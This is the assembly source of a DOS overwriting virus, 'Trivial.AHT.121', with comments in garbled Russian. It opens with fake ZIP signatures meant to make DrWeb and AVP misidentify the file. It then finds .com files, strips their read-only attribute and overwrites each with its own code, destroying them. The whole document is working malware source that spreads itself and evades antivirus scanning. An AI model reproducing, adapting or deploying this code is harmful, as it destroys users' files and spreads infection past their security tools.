   ; Virus Trivial.AHT.121 (c) by Duke/SMF
   ; This virus uses [ DrWeb & AVP cheat engine for Zip 8) ]

                   .model tiny
   ;                .386                 ; ï¢® «¨è¥¥ :(
                   .code
                   .startup
                   org 100h
   s:
   ;                dd      04034b50h    ; â ª ¡ë«® ¨§ ç «ì®
                   dd      30304b50h     ;   â ª áâ «® :)
                   pop     ax                  ; restore ax
                   inc     bx                  ; restore bx
   @1:
   ;ÚÄÄÄÄ[ Insert your code here ]ÄÄÄÄ¿
                   mov     ah,4Eh              ;*®¨áª ¯¥à¢®£® ä ©« 
                   call    Maska               ;‘®§¤ ¥¬ ¬ áªã ¤«ï ¯®¨áª 
   ;ÀÄÄÄ[ But less than 10 bytes! ]ÄÄÄÙ
   @2:
                   jmp     @3
                   db      10-(@2-@1) dup ('x')
                   db      12 dup (0)
                   dd      06054b50h
   @3:
   ;ÚÄÄÄÄ[ Insert your code here ]ÄÄÄÄ¿
                   int     21h
                   jnc     @5                  ;…á«¨ ä ©«  ©¤¥, â® ¯®à ¦ ¥¬,
                   ret                         ;¢ ¯à®â¨¢®¬ á«ãç ¥ ª®¥æ à ¡®âë.
   ;ÀÄÄÄ[ But less than 10 bytes! ]ÄÄÄÙ
   @4:
                   jmp     @5
                   db      12-(@4-@3) dup ('x')
                   db      12 dup (0)
   @5:
   ;ÚÄÄÄÄ[ Insert your code here ]ÄÄÄÄ¿
                   mov     ah,43h
   ;               mov     ax,4300h            ;*¥à¥¬ ä ©«®¢ë©  âà¨¡ãâë ¨ ¬¥ï¥¬
                   mov     dx,9Eh              ;¨å   ¤®áâã¯ ª çâ¥¨î/§ ¯¨á¨, ¨
                   int     21h                 ;ª®£¤  ¯à¨¤¥â ¢à¥¬ï ®âªàë¢ âì ä ©«
                                               ;¢¨àãá á¬®¦¥â ¯®à §¨âì ä ©«
                                               ;á  âà¨¡ãâ®¬ 'read only'.

                   mov     ax,4301h
                   mov     cl,0                ;” ©« ®áâ ¢«ï¥âáï ¤®áâã¯ë¬
                   int     21h                 ;¤«ï çâ¥¨ï/§ ¯¨á¨.


                   mov     ah,3dh
                   ;al ã¦¥ § ¡¨â à ¥¥
                   int     21h                 ;Žâªàë¢ ¥¬ ä ©« ¤«ï § ¯¨á¨

                   xchg    bx,ax               ;BX á®¤¥à¦¨â ä ©«®¢ë© handle

                   mov     ah,40h              ;”ãªæ¨ï § ¯¨á¨ ¢ ä ©«
                   mov     cl,e-s              ;CL = áª®«ìª® ¡ ©â ¯¨á âì
                   mov     dx,offset s         ;DX =  ç «® ª®¤  ¢¨àãá 
                   int     21h

                   mov     ah,3Eh              ;‡ ªàë¢ ¥¬ ä ©«
                   int     21h

                   mov     ah,4Fh              ;*®¨áª á«¥¤ãîé¥£® ä ©« 
                   jmp     short @3            ;*¥à¥å®¤   § à ¦¥¨¥

   Maska:                                      ;‘®§¤ ¥¬ ¬ áªã ¤«ï ¯®¨áª 

   ; ¢áï ¢®§ï á ¬ áª®© § ¤ã¬   á¯¥æ¨ «ì® ¤«ï AVP - ®  áâ®«ìª® ª®¬ ¤
   ; ¯¥à¥¢ à¨âì ¥ ¬®¦¥â ;))

                   mov     di,ax
                   mov     dx,ax
                   mov     al,'*'
                   stosb
                   mov     al,'.'
                   stosb
                   mov     al,'c'
                   stosb
                   mov     al,'o'
                   stosb
                   mov     al,'m'
                   stosb
                   mov     al,0
                   stosb
                   ret
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
   e:
   end
